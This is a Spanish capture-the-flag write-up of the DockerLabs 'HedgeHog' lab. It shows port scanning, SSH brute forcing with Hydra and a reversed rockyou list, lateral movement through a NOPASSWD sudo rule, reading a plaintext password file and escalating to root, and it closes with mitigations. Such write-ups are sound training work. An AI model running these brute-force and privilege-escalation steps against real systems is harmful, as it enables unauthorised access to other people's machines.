# HedgeHog
Laboratorio para practicar fuerza bruta SSH y escalada de privilegios mediante movimiento entre usuarios.
# Writeup — Máquina Vulnerable (DockerLabs)

> Dificultad: Fácil · Plataforma: [DockerLabs](https://dockerlabs.es)
> Autor del writeup: David Rodríguez Somolinos

Resolución completa de una máquina Docker vulnerable: enumeración, acceso por SSH mediante fuerza bruta, movimiento lateral entre usuarios y escalada a `root`.

---

## 📋 Información de la máquina

| | |
|---|---|
| **IP** | `172.17.0.2` |
| **SO** | Ubuntu 24.04.1 LTS |
| **Puertos abiertos** | 22 (SSH), 80 (HTTP) |
| **Usuarios implicados** | `tails` → `sonic` → `root` |

---

## 🔍 1. Reconocimiento

Escaneo completo de puertos con detección de servicios y scripts por defecto:

```bash
sudo nmap -p- -sS -sC -sV -vvv -T5 -Pn -n 172.17.0.2
```

Resultado relevante:

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
```

Solo dos servicios: SSH y un servidor web Apache.

---

## 🌐 2. Enumeración web

La página en `http://172.17.0.2` no tiene título ni contenido aparente, pero muestra una única cadena en el cuerpo:

```
tails
```

Esto filtra un **nombre de usuario válido** del sistema: `tails`. Es el punto de entrada para atacar SSH.

---

## 🔑 3. Acceso inicial — Fuerza bruta SSH

Con el usuario `tails` conocido, se ataca SSH con Hydra y `rockyou.txt`.

> **Nota:** `rockyou` entero contra SSH es inviable (~64 intentos/min → meses de ejecución). La contraseña estaba en la **parte final** del diccionario, así que invertir el orden del archivo con `tac` la alcanzó en segundos en lugar de horas.

```bash
# Invertir el orden de las líneas y limpiar espacios
tac /usr/share/wordlists/rockyou.txt | tr -d ' ' > final.txt

# Ataque con el diccionario reordenado
hydra -l tails -P final.txt ssh://172.17.0.2 -t4
```

Resultado:

```
[22][ssh] host: 172.17.0.2   login: tails   password: 3117548331
1 of 1 target successfully completed, 1 valid password found
```

Acceso por SSH:

```bash
ssh tails@172.17.0.2
# password: 3117548331
```

```
tails@3fe5e2347fbc:~$
```

**Credenciales:** `tails:3117548331`

---

## 🔄 4. Movimiento lateral — `tails` → `sonic`

Comprobación de privilegios `sudo`:

```bash
sudo -l
```

```
User tails may run the following commands on 3fe5e2347fbc:
    (sonic) NOPASSWD: ALL
```

`tails` puede ejecutar **cualquier comando como `sonic`** sin contraseña. Se abre una shell como `sonic`:

```bash
sudo -u sonic bash
```

En el directorio home de `sonic` hay un archivo con credenciales en texto plano:

```bash
cd /home/sonic/Documentos
cat contraseña
```

```
perritos!
```

**Credenciales:** `sonic:perritos!`

---

## 👑 5. Escalada a root — `sonic` → `root`

`su root` directo falla, pero `sonic` sí pertenece a `sudo`, y ya tenemos su contraseña:

```bash
sudo su
# password: perritos!
```

```
root@3fe5e2347fbc:/home/sonic/Documentos#
```

**Root conseguido.** 🎉

---

## 🗺️ Resumen de la cadena de explotación

```
Web (puerto 80)
   └─ filtra usuario: tails
Hydra SSH (rockyou invertido)
   └─ tails:3117548331
sudo -l  →  (sonic) NOPASSWD: ALL
   └─ sudo -u sonic bash
Archivo en claro /home/sonic/Documentos/contraseña
   └─ sonic:perritos!
sudo su
   └─ root
```

---

## 🛡️ Lecciones / mitigaciones

- **No exponer nombres de usuario** en servicios web públicos.
- **Deshabilitar la autenticación por contraseña en SSH** (usar claves) y aplicar `fail2ban`.
- **Evitar contraseñas débiles** presentes en diccionarios conocidos como `rockyou`.
- **Revisar reglas `sudo` permisivas** (`NOPASSWD: ALL` sobre otro usuario = movimiento lateral trivial).
- **Nunca almacenar contraseñas en texto plano** en el sistema de archivos.

---

